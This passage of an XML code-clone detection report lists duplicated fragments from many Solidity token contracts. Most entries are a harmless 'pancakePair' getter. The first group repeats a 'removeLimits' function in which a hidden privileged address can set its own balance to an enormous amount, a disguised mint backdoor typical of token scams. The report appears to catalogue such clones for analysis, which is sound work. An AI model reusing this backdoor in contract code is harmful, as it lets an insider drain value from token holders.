<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="41" endline="45" pcid="8177">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="45" endline="49" pcid="2729">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="47" endline="51" pcid="6193">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="43" endline="47" pcid="709">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="41" endline="45" pcid="6532">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="46" endline="50" pcid="8701">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="45" endline="49" pcid="7511">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="45" endline="49" pcid="1238">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="44" endline="48" pcid="3661">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="41" endline="45" pcid="9171">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="45" endline="49" pcid="4700">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="45" endline="49" pcid="6560">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="45" endline="49" pcid="6208">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="40" endline="44" pcid="4025">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="43" endline="47" pcid="9153">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
</class>

<class classid="35" nclones="465" nlines="3" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="52" endline="54" pcid="46">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="49" endline="51" pcid="7184">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="45" endline="47" pcid="7999">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="50" endline="52" pcid="9224">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="46" endline="48" pcid="5729">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="44" endline="46" pcid="4358">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="50" endline="52" pcid="3754">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="47" endline="49" pcid="207">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="48" endline="50" pcid="170">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="50" endline="52" pcid="3592">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="47" endline="49" pcid="7924">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="46" endline="48" pcid="2105">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="53" endline="55" pcid="8163">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="33" endline="35" pcid="8042">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="48" endline="50" pcid="2164">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="46" endline="48" pcid="921">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="48" endline="50" pcid="6359">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="46" endline="48" pcid="5493">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="48" endline="50" pcid="1519">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="43" endline="45" pcid="970">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="46" endline="48" pcid="1959">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="46" endline="48" pcid="7814">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="49" endline="51" pcid="2283">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="43" endline="45" pcid="3524">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="47" endline="49" pcid="1030">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="47" endline="49" pcid="287">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="43" endline="45" pcid="2715">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="50" endline="52" pcid="6890">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="44" endline="46" pcid="1894">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="47" endline="49" pcid="528">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="47" endline="49" pcid="8829">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="52" endline="54" pcid="5102">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="49" endline="51" pcid="3068">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="50" endline="52" pcid="4927">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="49" endline="51" pcid="5935">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="48" endline="50" pcid="5211">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="47" endline="49" pcid="4250">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="50" endline="52" pcid="4670">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="49" endline="51" pcid="8594">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="46" endline="48" pcid="3981">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="51" endline="53" pcid="9124">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="50" endline="52" pcid="1440">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="50" endline="52" pcid="1841">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="48" endline="50" pcid="1274">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="48" endline="50" pcid="3966">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="374" endline="376" pcid="5277">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="49" endline="51" pcid="3574">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="45" endline="47" pcid="4026">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="50" endline="52" pcid="8299">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="50" endline="52" pcid="8434">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="49" endline="51" pcid="6758">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="49" endline="51" pcid="5639">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="46" endline="48" pcid="4041">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="50" endline="52" pcid="1380">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="47" endline="49" pcid="7601">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="43" endline="45" pcid="6179">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="52" endline="54" pcid="76">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="50" endline="52" pcid="4205">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="49" endline="51" pcid="6314">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="50" endline="52" pcid="6209">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="50" endline="52" pcid="4150">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="55" endline="57" pcid="8762">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="162" endline="164" pcid="6493">
    function uniswapPair() public view virtual returns (address) {
        return IUniswapV2Pair(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="46" endline="48" pcid="6743">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="47" endline="49" pcid="2877">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="46" endline="48" pcid="8344">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="50" endline="52" pcid="5141">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="52" endline="54" pcid="5057">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="44" endline="46" pcid="1425">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="47" endline="49" pcid="8891">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="50" endline="52" pcid="7708">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="43" endline="45" pcid="1621">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="51" endline="53" pcid="3996">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="48" endline="50" pcid="543">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="50" endline="52" pcid="3383">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="47" endline="49" pcid="5699">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="46" endline="48" pcid="6533">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="46" endline="48" pcid="3799">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="49" endline="51" pcid="6045">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="45" endline="47" pcid="4280">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="55" endline="57" pcid="5844">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="48" endline="50" pcid="7321">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="50" endline="52" pcid="9016">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="51" endline="53" pcid="1504">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="45" endline="47" pcid="6344">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="45" endline="47" pcid="8029">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="46" endline="48" pcid="8239">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="86" endline="88" pcid="596">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="51" endline="53" pcid="8404">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="50" endline="52" pcid="7437">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="86" endline="88" pcid="3857">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="53" endline="55" pcid="558">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="46" endline="48" pcid="7199">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="45" endline="47" pcid="8389">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="50" endline="52" pcid="2730">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="50" endline="52" pcid="1576">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="45" endline="47" pcid="891">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="47" endline="49" pcid="7260">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="53" endline="55" pcid="573">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="46" endline="48" pcid="6259">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="51" endline="53" pcid="8702">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="47" endline="49" pcid="3283">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="50" endline="52" pcid="5540">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="43" endline="45" pcid="8846">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="43" endline="45" pcid="9070">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
